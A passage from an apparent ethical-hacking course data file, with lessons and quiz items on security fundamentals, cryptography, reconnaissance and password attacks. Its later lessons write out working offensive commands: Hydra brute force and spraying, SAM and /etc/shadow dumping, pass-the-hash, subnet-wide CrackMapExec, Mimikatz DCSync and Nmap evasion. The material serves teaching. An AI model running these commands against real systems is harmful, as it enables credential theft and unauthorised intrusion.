Security is not a product you buy — it is a process. Before learning to attack or defend, you need a mental model for thinking about security that will guide every decision you make.

## The CIA Triad

Every security control, attack, and incident can be mapped to one or more of three properties:

**Confidentiality** — information is accessible only to those authorised to see it.
- Violated by: data breaches, eavesdropping, credential theft, improper access controls
- Controls: encryption, access controls, classification, DLP

**Integrity** — data is accurate, complete, and has not been tampered with.
- Violated by: man-in-the-middle modification, SQL injection altering database records, malware corrupting files
- Controls: hashing, digital signatures, checksums, version control

**Availability** — systems and data are accessible when needed.
- Violated by: DoS/DDoS attacks, ransomware, hardware failure
- Controls: redundancy, backups, rate limiting, DDoS mitigation

**Additional properties (beyond CIA):**
- **Non-repudiation** — a party cannot deny an action (digital signatures provide this)
- **Authenticity** — the origin of data can be verified

## Authentication vs Authorisation

These are distinct concepts that are frequently confused:

| | Authentication | Authorisation |
|---|---|---|
| **Question** | Who are you? | What are you allowed to do? |
| **Mechanism** | Password, MFA, certificate, biometric | RBAC, ACLs, policies |
| **Failure** | Impersonation | Privilege escalation, IDOR |

**Authentication factors:**
1. Something you **know** — password, PIN, security question
2. Something you **have** — hardware token, phone (TOTP), smart card
3. Something you **are** — fingerprint, face, iris scan

**MFA** combines two or more factors. SMS-based MFA is weak (SIM swapping attacks). TOTP apps (Google Authenticator) and hardware keys (YubiKey, FIDO2) are stronger.

**Common authentication attacks:**
- Password brute force (weak passwords)
- Credential stuffing (breached passwords reused on other sites)
- Phishing (stealing credentials)
- Pass-the-Hash (Windows — steal NTLM hash, no plaintext needed)
- Golden Ticket (Kerberos — forge authentication tickets)

## Threat Modelling with STRIDE

Threat modelling is the process of systematically identifying threats to a system. STRIDE is a Microsoft framework that categorises threats:

| Letter | Threat | CIA Property Violated |
|---|---|---|
| **S** | Spoofing | Authenticity |
| **T** | Tampering | Integrity |
| **R** | Repudiation | Non-repudiation |
| **I** | Information Disclosure | Confidentiality |
| **D** | Denial of Service | Availability |
| **E** | Elevation of Privilege | Authorisation |

**Example: threat modelling a web login form**
\`\`\`
STRIDE analysis of /login endpoint:

S - Spoofing: attacker submits credentials as another user
T - Tampering: modify POST data in transit (if no HTTPS)
R - Repudiation: no logging of login attempts (no audit trail)
I - Info Disclosure: verbose error reveals valid usernames ("user not found" vs "wrong password")
D - DoS: flood with login attempts, lock out legitimate users
E - Elevation: successful login as admin user
\`\`\`

## Risk Assessment

Risk is a function of two variables:
\`\`\`
Risk = Likelihood × Impact

CVSS score = standardised numeric representation of vulnerability risk
\`\`\`

**CVSS v3 scoring factors:**
- Attack Vector (Network/Adjacent/Local/Physical)
- Attack Complexity (Low/High)
- Privileges Required (None/Low/High)
- User Interaction (None/Required)
- Scope (Unchanged/Changed)
- CIA Impact (None/Low/High each)

Score 0-10: 0=None, 0.1-3.9=Low, 4.0-6.9=Medium, 7.0-8.9=High, 9.0-10=Critical

## Legal Framework — Ethical Hacking

**Without authorisation, everything in this curriculum is illegal.** Always have written permission.

**Key legislation:**
- **Computer Fraud and Abuse Act (CFAA)** — USA — criminalises unauthorised access
- **Computer Misuse Act 1990** — UK — similar framework
- **GDPR** — data protection, breach notification obligations
- **EU NIS2 Directive** — critical infrastructure security requirements

**Authorisation documents you need:**
1. **Rules of Engagement (RoE)** — defines scope, allowed techniques, timing, emergency contacts
2. **Statement of Work (SoW)** — contractual agreement
3. **Get Out of Jail Letter** — letter from client confirming authorisation (carry this)

**Scope** defines exactly what you may test. If 10.10.10.5 is in scope and 10.10.10.6 is not, you must not touch 10.10.10.6 even if you compromise 10.10.10.5 and find a path to it.

## The CEH Code of Ethics

The EC-Council CEH certification requires adherence to an ethical code:
- Keep client information strictly confidential
- Never access systems without explicit permission
- Do not use discovered information for personal gain
- Report all findings honestly, even if they reflect poorly on the client
- Never install persistent malware without scope authorisation`,
          interviewQuestions: [
            { question: "A user can view other users' account data by changing the user ID in the URL. Which part of the CIA Triad is violated, and what type of vulnerability is this?", answer: "Confidentiality is violated. This is an IDOR (Insecure Direct Object Reference) vulnerability — an authorisation failure where the application does not verify that the requesting user is permitted to access the requested resource.", difficulty: "junior" },
            { question: "What is the difference between a vulnerability, a threat, and a risk?", answer: "A vulnerability is a weakness in a system (e.g., unpatched software). A threat is a potential cause of harm (e.g., an attacker who could exploit that weakness). Risk is the likelihood that the threat will exploit the vulnerability multiplied by the impact if it does. You cannot always eliminate risk, but you can reduce likelihood or impact.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "A web application returns 'Invalid username' for unknown users and 'Invalid password' for known users. Which STRIDE threat does this represent?", answer: "Information Disclosure (I). The different error messages reveal whether a username exists, enabling an attacker to enumerate valid usernames before attempting password attacks. The fix is to return a generic 'Invalid credentials' message for both cases.", type: "scenario", difficulty: "junior" }
          ]
        },
        {
          id: "cryptography-deep-dive",
          title: "Cryptography & PKI Deep Dive",
          duration: 75,
          type: "lesson",
          description: "Symmetric encryption, asymmetric encryption, hashing, PKI, TLS/SSL handshake, and the attacks against each — knowing crypto makes you a better attacker and defender.",
          objectives: [
            "Explain AES, RSA, and Diffie-Hellman from first principles",
            "Understand hashing (MD5, SHA-1/256/512) and its role in security",
            "Trace the TLS handshake step-by-step",
            "Identify and exploit common cryptographic weaknesses",
            "Understand PKI, certificate chains, and certificate pinning"
          ],
          content: `# Cryptography & PKI Deep Dive

Cryptography is the mathematical foundation of most security controls. Attackers exploit it when it is weak or misimplemented. Defenders rely on it for confidentiality, integrity, and authentication. You need to understand it deeply.

## Symmetric Encryption

The same key is used to encrypt and decrypt. Fast, but the key must be shared securely.

\`\`\`
Plaintext + Key → [Cipher Algorithm] → Ciphertext
Ciphertext + Key → [Cipher Algorithm] → Plaintext
\`\`\`

**AES (Advanced Encryption Standard)** — the gold standard:
- Block cipher: processes data in 128-bit blocks
- Key sizes: 128, 192, 256 bits
- Modes of operation matter enormously:
  - **ECB (Electronic Codebook)** — each block encrypted independently — INSECURE, patterns visible
  - **CBC (Cipher Block Chaining)** — each block XORed with previous ciphertext before encrypting — requires IV
  - **GCM (Galois/Counter Mode)** — provides both confidentiality AND authentication — RECOMMENDED

\`\`\`
AES-ECB weakness (the penguin problem):
Encrypt the same plaintext block → same ciphertext block
If an image is AES-ECB encrypted, the structure/pattern of the image is still visible!

AES-CBC with weak/reused IV → BEAST attack
AES-GCM with nonce reuse → catastrophic failure
\`\`\`

## Asymmetric Encryption

Two mathematically related keys: public and private. What one encrypts, only the other can decrypt.

\`\`\`
Encrypt for confidentiality:
  Sender encrypts with recipient's PUBLIC key
  Only recipient's PRIVATE key can decrypt
  → Even the sender cannot decrypt after sending

Sign for authentication/integrity:
  Signer signs with their PRIVATE key
  Anyone can verify with the signer's PUBLIC key
  → Proves the message came from the key holder
\`\`\`

**RSA (Rivest–Shamir–Adleman):**
- Security based on difficulty of factoring large numbers
- Key sizes: 2048-bit minimum (4096-bit recommended)
- Weakness: 1024-bit RSA can be factored with enough compute
- Not used for bulk encryption (slow) — used to exchange a symmetric key

**Diffie-Hellman Key Exchange:**
Allows two parties to establish a shared secret over an insecure channel without ever transmitting the secret itself. Used in TLS to achieve forward secrecy.

\`\`\`
Alice and Bob agree on public parameters (large prime p, generator g)
Alice picks private a, computes A = g^a mod p, sends A to Bob
Bob picks private b, computes B = g^b mod p, sends B to Alice
Alice computes: B^a mod p = g^(ab) mod p = shared secret
Bob computes:   A^b mod p = g^(ab) mod p = same shared secret
Eve sees A and B but cannot compute g^(ab) mod p (discrete log problem)
\`\`\`

**Elliptic Curve Cryptography (ECC):**
- Same security as RSA but with much smaller keys (256-bit ECC ≈ 3072-bit RSA)
- Used in TLS, SSH, Bitcoin, modern mobile crypto

## Hashing

A hash function takes input of any length and produces a fixed-length output. One-way: cannot reverse the hash to get the input. The same input always produces the same hash.

\`\`\`bash
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99

echo -n "password" | sha256sum
# 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
\`\`\`

| Algorithm | Output Size | Status |
|---|---|---|
| MD5 | 128 bits (32 hex) | Broken — collision attacks exist |
| SHA-1 | 160 bits (40 hex) | Deprecated — SHAttered collision |
| SHA-256 | 256 bits (64 hex) | Secure — widely used |
| SHA-512 | 512 bits (128 hex) | Secure — high security applications |
| bcrypt | variable | Secure — designed for passwords (slow) |
| Argon2 | variable | Secure — password hashing winner |

**Why bcrypt for passwords?** Deliberately slow (adjustable work factor). Makes brute force expensive. MD5/SHA-256 are fast by design — a GPU can compute billions per second, making them terrible for passwords.

**Rainbow Tables:** Pre-computed hash-to-plaintext tables. Defeated by **salting**: add a unique random value to each password before hashing. \`bcrypt\` handles this automatically.

## PKI and X.509 Certificates

Public Key Infrastructure (PKI) is the system that binds public keys to identities through trusted certificates.

\`\`\`
Certificate Authority (CA) — Trusted root (DigiCert, Let's Encrypt, internal CA)
    └── Intermediate CA — Signs end-entity certificates
            └── Server Certificate — example.com's cert
                ├── Subject: CN=example.com
                ├── Public Key: [RSA/EC public key]
                ├── Valid From: 2024-01-01
                ├── Valid Until: 2025-01-01
                ├── Issuer: Let's Encrypt Authority R3
                └── Signature: [signed by Intermediate CA's private key]
\`\`\`

Your browser/OS ships with ~150 trusted root CA certificates. If ANY of these is compromised or malicious, it can issue trusted certificates for any domain.

**Certificate attacks:**
- **Expired certificate** — server forgot to renew, browser shows warning
- **Self-signed certificate** — no CA validation, easily MITMed
- **SSL stripping** — downgrade HTTPS to HTTP (requires MITM position)
- **Subdomain takeover** — claim a dangling CNAME target, get a valid cert
- **Certificate Transparency** — all certs are logged publicly — use crt.sh to enumerate subdomains

## The TLS Handshake (TLS 1.3)

\`\`\`
Client                                    Server
  │                                          │
  │─── ClientHello ─────────────────────────>│
  │    (TLS version, cipher suites, random)  │
  │                                          │
  │<── ServerHello + Certificate ────────────│
  │    (chosen cipher, server cert, random)  │
  │                                          │
  │    [Client verifies certificate:         │
  │     - Is it signed by trusted CA?        │
  │     - Is CN/SAN = hostname?              │
  │     - Is it expired?                     │
  │     - Is it revoked (OCSP)?]             │
  │                                          │
  │─── Key Exchange (Diffie-Hellman) ───────>│
  │                                          │
  │    [Both derive session keys]            │
  │                                          │
  │<════ Encrypted Application Data ════════>│
\`\`\`

**Historic TLS attacks:**
- **POODLE** (CVE-2014-3566) — SSLv3 padding oracle, force downgrade
- **BEAST** (CVE-2011-3389) — CBC IV prediction in TLS 1.0
- **HEARTBLEED** (CVE-2014-0160) — OpenSSL bug, read server memory including private keys
- **DROWN** (CVE-2016-0800) — SSLv2 allows decryption of TLS traffic
- **CRIME/BREACH** — compression + encryption oracle

\`\`\`bash
# Test SSL/TLS configuration
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com
\`\`\``,
          interviewQuestions: [
            { question: "What is the difference between encrypting with a public key versus signing with a private key?", answer: "Encrypting with a public key provides confidentiality — only the private key holder can decrypt, so the message is kept secret. Signing with a private key provides authentication and integrity — anyone with the public key can verify the signature, proving the message came from the key holder and was not tampered with.", difficulty: "mid" },
            { question: "Why is MD5 no longer considered safe for cryptographic use?", answer: "MD5 is vulnerable to collision attacks — it is computationally feasible to find two different inputs that produce the same MD5 hash. This breaks integrity guarantees (a tampered file could have the same MD5 as the original). For passwords, MD5 is also insecure because it is very fast, allowing billions of guesses per second with GPUs.", difficulty: "junior" }
          ],
          quizQuestions: [
            { question: "A developer stores user passwords as unsalted MD5 hashes. Describe two distinct attacks an attacker could use if they obtain the hash database.", answer: "1) Rainbow table attack: use precomputed MD5-to-plaintext tables to instantly reverse common passwords. 2) Brute force/dictionary attack: since MD5 is fast, a GPU can compute billions of MD5 hashes per second, quickly cracking weak passwords. Salting defeats rainbow tables but brute force remains unless a slow hash function like bcrypt is used.", type: "scenario", difficulty: "mid" }
          ]
        }
      ],
      exam: [
        { question: "Which encryption mode should be preferred for AES and why?", answer: "AES-GCM (Galois/Counter Mode) — it provides both confidentiality (encryption) and data authenticity (authentication tag), detects tampering, and does not have the block pattern vulnerability of ECB or the IV reuse issues of CBC.", difficulty: "mid" },
        { question: "What is a rainbow table and how does password salting defeat it?", answer: "A rainbow table is a precomputed lookup table mapping hashes back to plaintexts. Salting adds a unique random string to each password before hashing, so even two users with the same password have different hashes. This means a pre-built rainbow table is useless — you would need a separate table for every possible salt value.", difficulty: "mid" }
      ]
    },

    // ─── MODULE 4: ETHICAL HACKING METHODOLOGY & RECON ───────────────────────
    {
      id: "recon-osint",
      title: "Reconnaissance & OSINT",
      level: "intermediate",
      description: "The first phase of every engagement. Master passive and active reconnaissance to map a target's attack surface without triggering alerts.",
      lessons: [
        {
          id: "passive-recon-osint",
          title: "Passive Reconnaissance & OSINT",
          duration: 70,
          type: "lesson",
          description: "Gather intelligence on a target without ever touching their systems — WHOIS, DNS enumeration, Google dorking, Shodan, theHarvester, and OSINT frameworks.",
          objectives: [
            "Perform WHOIS and DNS enumeration to map infrastructure",
            "Use Google dorks to find exposed sensitive information",
            "Enumerate subdomains with Amass and Subfinder",
            "Find internet-exposed devices with Shodan",
            "Build a target profile using theHarvester and Maltego"
          ],
          content: `# Passive Reconnaissance & OSINT

Passive recon means gathering information without sending a single packet to the target. You are watching from a distance — using public records, search engines, and third-party data. This is always the first step and is completely legal (you are only querying public resources).

## The Hacking Methodology

Before diving in, understand the framework:

\`\`\`
Phase 1: Reconnaissance    ← We are here
Phase 2: Scanning
Phase 3: Enumeration
Phase 4: Gaining Access
Phase 5: Privilege Escalation
Phase 6: Maintaining Access
Phase 7: Covering Tracks
\`\`\`

## WHOIS — Who Owns This Domain?

\`\`\`bash
whois example.com        # registrar, registrant, name servers, dates
whois 93.184.216.34      # IP address ownership

# Key fields to extract:
# Registrant: name, org, email, address
# Name Servers: ns1.example.com, ns2.example.com → DNS provider
# Creation Date, Expiry Date
# Abuse contact email
\`\`\`

**Privacy protection:** Many registrants use WHOIS privacy services. Historical WHOIS databases (DomainTools, ViewDNS.info) may reveal info before privacy was enabled.

## DNS Enumeration

DNS records reveal the infrastructure map of an organisation.

\`\`\`bash
# A record — IPv4 address
dig example.com A

# MX record — mail servers
dig example.com MX
# MX records reveal email provider (Google Workspace, Microsoft 365, etc.)

# NS record — authoritative name servers
dig example.com NS

# TXT records — often contain SPF, DKIM, verification tokens
dig example.com TXT
# Look for: v=spf1, _dmarc, google-site-verification

# CNAME — aliases (look for dangling CNAMEs → subdomain takeover)
dig www.example.com CNAME

# Zone transfer (try all name servers)
dig axfr @ns1.example.com example.com
# If allowed: dumps ALL DNS records — complete infrastructure map
\`\`\`

## Subdomain Enumeration

Subdomains expose development environments, admin panels, old applications, and forgotten infrastructure.

\`\`\`bash
# Passive DNS (no direct contact with target)
amass enum -passive -d example.com
subfinder -d example.com
assetfinder --subs-only example.com

# Certificate Transparency logs (all certs issued are public)
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u

# From the crt.sh output, you might find:
# dev.example.com
# staging.example.com
# admin.example.com
# api-internal.example.com

# Active DNS brute force (now making requests — semi-active)
amass enum -brute -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
\`\`\`

## Google Dorking

Google has indexed more of the internet than any scanner. Operators let you search with surgical precision.

\`\`\`
site:example.com                          # all indexed pages for a domain
site:example.com filetype:pdf            # PDF files
site:example.com inurl:admin             # admin URLs
site:example.com intitle:"index of"      # directory listings
site:example.com intext:"password"       # pages containing "password"

# Find login pages
site:example.com inurl:login OR inurl:signin OR inurl:auth

# Find exposed configuration files
site:example.com filetype:env OR filetype:config OR filetype:conf
site:example.com ext:sql                 # exposed SQL dumps

# Find exposed credentials (GitHub dorks)
site:github.com "example.com" password
site:github.com "example.com" api_key
site:github.com "example.com" secret

# Find cameras, printers, routers
intitle:"live view" inurl:view.shtml     # IP cameras
intitle:"AXIS" "Video Server"            # Axis cameras
\`\`\`

## Shodan — The Search Engine for Internet-Connected Devices

Shodan continuously scans the internet and indexes banner information from every open port. It is passive — you are querying Shodan's database, not the target.

\`\`\`
Shodan searches:
org:"Example Corp"                       # all IPs owned by an organisation
hostname:example.com                     # systems with that hostname
net:93.184.216.0/24                      # specific subnet
port:22 country:US city:"San Francisco"  # SSH servers in SF
product:"Apache httpd" version:"2.4.49"  # specific vulnerable version
vuln:CVE-2021-44228                      # log4shell vulnerable systems
"default password" port:23              # telnet with default creds

# Shodan CLI
shodan host 93.184.216.34               # full host report
shodan search "org:Example Corp" --fields ip_str,port,product
shodan count "apache 2.4.49"
\`\`\`

## theHarvester — Email and Domain Intelligence

\`\`\`bash
theHarvester -d example.com -b all -l 500
# Sources: Google, Bing, LinkedIn, Twitter, Shodan, Hunter, etc.

# Output includes:
# Emails: john.smith@example.com, admin@example.com
# Hosts: mail.example.com, vpn.example.com, dev.example.com
# IPs: 93.184.216.34, 93.184.216.35

# Target specific source
theHarvester -d example.com -b linkedin    # employee names
theHarvester -d example.com -b shodan      # internet-exposed hosts
\`\`\`

## Building a Target Profile

After running all tools, organise findings into an attack surface map:

\`\`\`
TARGET: example.com
================================
IPs/ASN: 93.184.216.0/24 (AS15133 — Verizon)
Registrar: Namecheap (expires 2026-01-15)
Name Servers: ns1.cloudflare.com, ns2.cloudflare.com → Cloudflare (real IPs hidden behind CDN)

Subdomains discovered:
  mail.example.com → 192.0.2.5 (Exchange Server, port 443, 25, 587)
  vpn.example.com  → 192.0.2.10 (Cisco ASA, port 443)
  dev.example.com  → 192.0.2.20 (Apache 2.4.49 — VULNERABLE to CVE-2021-41773!)
  api.example.com  → 192.0.2.25 (Node.js, port 3000)

Emails harvested: 14 addresses, pattern: firstname.lastname@example.com
Tech stack (from headers): PHP 7.4, WordPress 5.8, nginx 1.18

Interesting findings:
  - dev.example.com has directory listing enabled
  - .git directory accessible on www.example.com
  - Job postings mention "AWS", "Kubernetes", "Jenkins"
================================
\`\`\``,
          interviewQuestions: [
            { question: "What is subdomain takeover and how would you identify it?", answer: "Subdomain takeover occurs when a DNS CNAME record points to an external service (e.g., GitHub Pages, Heroku, S3) that has been deleted or deregistered. An attacker can claim that service and serve content under the legitimate subdomain. Identify it by checking CNAME records with dig, following the chain, and verifying if the target service responds with an unclaimed error.", difficulty: "mid" },
            { question: "How can Certificate Transparency logs be used in reconnaissance?", answer: "Certificate Transparency requires all publicly-trusted CAs to log every certificate they issue to public CT logs. Querying crt.sh for a wildcard search (%.example.com) reveals every certificate ever issued for that domain — exposing subdomains including internal, staging, and development environments that may not appear in DNS or search engines.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "You find admin.example.com in CT logs but it resolves to a 'This repository is not found' page on GitHub. What vulnerability might be present?", answer: "Subdomain takeover. The DNS CNAME likely points to a GitHub Pages repository that has been deleted. An attacker could create a GitHub account, create a repository with the matching name, and serve malicious content under admin.example.com — a trusted subdomain.", type: "scenario", difficulty: "mid" }
          ]
        },
        {
          id: "active-recon-scanning",
          title: "Active Reconnaissance & Scanning",
          duration: 65,
          type: "lesson",
          description: "Move from passive observation to active probing — Nmap deep dive, service enumeration, vulnerability scanning with Nessus and Nuclei.",
          objectives: [
            "Master Nmap scan types and when to use each",
            "Enumerate SMB, SNMP, LDAP, and FTP services",
            "Use the Nmap Scripting Engine for targeted vulnerability detection",
            "Run vulnerability scans with Nessus and Nuclei",
            "Interpret scan results to prioritise attack paths"
          ],
          content: `# Active Reconnaissance & Scanning

Active recon means you are directly probing the target. This will appear in firewall logs and IDS alerts. Always ensure you have authorisation before this phase.

## Nmap Mastery

Nmap is the backbone of network scanning. Understanding every scan type makes you both a better attacker and defender.

\`\`\`bash
# Phase 1: Host discovery (which IPs are alive?)
nmap -sn 192.168.1.0/24                    # ICMP ping sweep
nmap -sn -PE -PP -PM 192.168.1.0/24       # ICMP echo, timestamp, netmask
nmap -sn --send-ip 192.168.1.0/24         # ARP (local network only)

# Phase 2: Quick port scan to find interesting targets
nmap -sS -T4 --open -p- 192.168.1.10      # all 65535 ports, SYN scan, fast
nmap -sS -T4 --top-ports 1000 192.168.1.10 # top 1000 most common ports

# Phase 3: Service and version detection
nmap -sV -sC -O -p 22,80,443,8080 192.168.1.10
# -sV: version detection
# -sC: default NSE scripts
# -O:  OS fingerprinting

# Phase 4: Targeted scripting
nmap --script "vuln" 192.168.1.10          # all vuln detection scripts
nmap --script smb-vuln-ms17-010 192.168.1.10  # EternalBlue check
nmap --script http-shellshock 192.168.1.10     # Shellshock
nmap --script ssl-heartbleed 192.168.1.10      # Heartbleed

# Evading detection
nmap -sS -T1 -f 192.168.1.10              # slow, fragment packets
nmap -D RND:10 192.168.1.10               # decoy scan (random source IPs)
nmap --source-port 53 192.168.1.10        # spoof source port (DNS traffic often allowed)
nmap --data-length 25 192.168.1.10        # add random padding
\`\`\`

## SMB Enumeration

SMB is the most common source of critical vulnerabilities in Windows environments.

\`\`\`bash
# Check for MS17-010 (EternalBlue — WannaCry)
nmap --script smb-vuln-ms17-010 -p445 192.168.1.10

# Enumerate shares
smbclient -L //192.168.1.10 -N            # anonymous
smbclient -L //192.168.1.10 -U admin      # with credentials
smbmap -H 192.168.1.10                    # permissions on each share

# Full enumeration
enum4linux -a 192.168.1.10
# Reveals: OS info, domain, users, groups, shares, password policy

# Connect to a share
smbclient //192.168.1.10/SYSVOL -U admin
smb: \> ls
smb: \> get interesting_file.txt
\`\`\`

## SNMP Enumeration

SNMP (Simple Network Management Protocol) on port 161/UDP is often forgotten but reveals enormous amounts of information.

\`\`\`bash
# Check if SNMP is running (community string "public" is default)
nmap -sU -p 161 192.168.1.10
snmpwalk -v 2c -c public 192.168.1.10     # walk MIB tree

# Key OIDs to query
snmpget -v 2c -c public 192.168.1.10 1.3.6.1.2.1.1.1.0   # system description
snmpwalk -v 2c -c public 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v 2c -c public 192.168.1.10 1.3.6.1.2.1.25.6.3.1.2  # installed software

# Brute force community string
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.10
\`\`\`

## LDAP Enumeration

Active Directory exposes LDAP. Anonymous binds often reveal users, groups, and policies.

\`\`\`bash
# Test anonymous bind
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"

# Enumerate users
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName

# With credentials
ldapsearch -x -H ldap://192.168.1.10 -D "user@example.com" -w "Password1" \
  -b "dc=example,dc=com" "(objectClass=group)" cn member
\`\`\`

## Vulnerability Scanning with Nuclei

Nuclei uses templates to check for thousands of vulnerabilities. Faster and more flexible than Nessus for external assessments.

\`\`\`bash
# Install and update templates
nuclei -update-templates

# Scan a target
nuclei -u https://example.com                     # all templates
nuclei -u https://example.com -t cves/            # CVE templates only
nuclei -u https://example.com -t exposures/       # exposed files/configs
nuclei -u https://example.com -severity critical,high  # filter by severity

# Scan a list of targets
nuclei -l targets.txt -t cves/ -o results.txt

# Common findings:
# Exposed .git directories (source code disclosure)
# Default credentials on admin panels
# CVE-2021-44228 (Log4Shell)
# CVE-2021-41773 (Apache path traversal)
# Exposed .env files with credentials
\`\`\``,
          interviewQuestions: [
            { question: "What is the difference between a SYN scan and a TCP connect scan, and when would you use each?", answer: "A SYN scan sends SYN and receives SYN-ACK or RST without completing the handshake. It requires raw socket privileges (root) but is faster and may not appear in application logs. A TCP connect scan completes the full three-way handshake using the OS's socket API, works without root, but is more likely to be logged and slightly slower.", difficulty: "junior" },
            { question: "Why is SNMP with default community strings so dangerous?", answer: "The 'public' community string in SNMPv1/v2c allows read access to the MIB tree, which contains detailed information about the device: running processes, installed software, network interfaces, routing tables, and configuration. Some writable community strings ('private') allow configuration changes. This data can guide further attacks and is often accessible with no authentication.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "Nmap returns 'filtered' for a port. What does this mean and how does it differ from 'closed'?", answer: "Filtered means a firewall or packet filter is blocking the probe — the port may be open or closed but Nmap cannot determine which because packets are dropped (no response) or an ICMP unreachable is returned. Closed means the port definitively has no service listening — the target responded with RST.", type: "scenario", difficulty: "junior" }
          ]
        }
      ],
      exam: [
        { question: "Which tool would you use to find all subdomains of a target by querying Certificate Transparency logs without touching the target?", answer: "crt.sh (via curl/browser) or tools like Subfinder and Amass in passive mode — they query CT logs and other passive sources without sending packets to the target.", difficulty: "junior" },
        { question: "What does enum4linux reveal about a Windows target and why is this information valuable?", answer: "enum4linux queries SMB and MSRPC to reveal: OS version, domain/workgroup name, all local users and their RIDs, groups, password policy (lockout threshold, complexity requirements), and shared resources. This information guides subsequent attacks — usernames for brute force, password policy to avoid lockouts, shares for data access.", difficulty: "mid" }
      ]
    },

    // ─── MODULE 5: SYSTEM HACKING ─────────────────────────────────────────────
    {
      id: "system-hacking",
      title: "System Hacking & Privilege Escalation",
      level: "intermediate",
      description: "Password attacks, Metasploit exploitation, post-exploitation, and privilege escalation on both Linux and Windows systems.",
      lessons: [
        {
          id: "password-attacks",
          title: "Password Attacks & Credential Access",
          duration: 75,
          type: "lesson",
          description: "Brute force, dictionary attacks, rainbow tables, pass-the-hash, Mimikatz, Hydra, John the Ripper, and Hashcat — the complete credential attack toolkit.",
          objectives: [
            "Perform online password attacks with Hydra against SSH, FTP, and web forms",
            "Crack password hashes with John the Ripper and Hashcat",
            "Understand and perform pass-the-hash attacks on Windows",
            "Extract credentials from Windows memory with Mimikatz concepts",
            "Implement defences: account lockout, MFA, strong password policies"
          ],
          content: `# Password Attacks & Credential Access

Passwords are the most common authentication mechanism and the most commonly broken. Understanding every password attack technique teaches you what to defend against.

## Online Password Attacks — Hydra

Online attacks test passwords directly against a live service. Slow (network-bound) and noisy (logs every attempt).

\`\`\`bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.10

# HTTP POST login form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
# Format: "path:POST_data:failure_string"

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# Password spraying (try one password against many users — avoids lockout)
hydra -L users.txt -p "Welcome123" ssh://192.168.1.10 -t 1
\`\`\`

**Lockout awareness:** Many systems lock accounts after 3-5 failed attempts. Password spraying — trying one common password (e.g., "Company2024!") against all users — avoids this by staying under the threshold per account.

## Offline Password Cracking

Once you have a hash file (from a database dump, SAM file, /etc/shadow), cracking is entirely local — fast, unlimited attempts, no lockout.

### John the Ripper

\`\`\`bash
# Crack /etc/shadow
john /etc/shadow
john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt
john /etc/shadow --rules                    # apply mangling rules
john --show /etc/shadow                     # show cracked passwords

# Identify hash format
john --list=formats | grep -i md5
john hash.txt --format=md5crypt

# Common formats
john hash.txt --format=bcrypt
john hash.txt --format=NT                   # Windows NTLM
john hash.txt --format=sha256crypt
\`\`\`

### Hashcat

Hashcat is faster than John on GPU. It is the tool for serious password cracking.

\`\`\`bash
# Identify hash type first
hashcat --identify hash.txt
# Or check hashcat.net/wiki/doku.php?id=hashcat for mode numbers

# Common hash modes (-m flag)
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM (Windows)
# 1800 = sha512crypt (Linux /etc/shadow)
# 3200 = bcrypt
# 13100 = Kerberos 5 TGS (Kerberoasting)

# Dictionary attack
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Rules-based attack (most effective for real passwords)
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force mask attack (7-char alphanumeric)
hashcat -m 1000 ntlm_hashes.txt -a 3 ?a?a?a?a?a?a?a
# ?l=lowercase ?u=uppercase ?d=digit ?s=symbol ?a=all

# Combination attack (word1 + word2)
hashcat -m 1000 hashes.txt -a 1 words1.txt words2.txt
\`\`\`

## Windows Credential Attacks

### NTLM and Pass-the-Hash

Windows stores password hashes in the SAM database and LSASS process. You do not always need the plaintext password — the NTLM hash is sufficient.

\`\`\`bash
# Dump SAM database (requires SYSTEM privileges)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Transfer to Kali and extract hashes:
secretsdump.py -sam sam.bak -system system.bak LOCAL

# Or with Impacket if you have credentials:
secretsdump.py administrator:Password1@192.168.1.10

# Pass the Hash — authenticate using the NTLM hash (no plaintext needed)
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.10 cmd.exe

# With CME (CrackMapExec)
crackmapexec smb 192.168.1.10 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
crackmapexec smb 192.168.1.0/24 -u administrator -H <hash>  # spray entire subnet
\`\`\`

### Mimikatz Concepts

Mimikatz reads credentials from LSASS memory. With SYSTEM/debug privileges:

\`\`\`
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    ← dump plaintext passwords from LSASS
mimikatz # sekurlsa::wdigest           ← WDigest credentials (pre-Win8)
mimikatz # sekurlsa::tickets           ← Kerberos tickets
mimikatz # lsadump::sam                ← SAM database hashes
mimikatz # lsadump::dcsync /user:krbtgt ← DCSync attack (extract domain hashes)
\`\`\`

**Defenders:** LSASS protection, Credential Guard (Windows 10+), disable WDigest authentication, EDR monitoring for LSASS memory reads.

## Linux Password Attacks

\`\`\`bash
# /etc/shadow format: username:$algorithm$salt$hash:...
# $1$ = MD5, $2y$ = bcrypt, $5$ = SHA-256, $6$ = SHA-512

# Crack with John
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# With Hashcat (identify: $6$ = mode 1800)
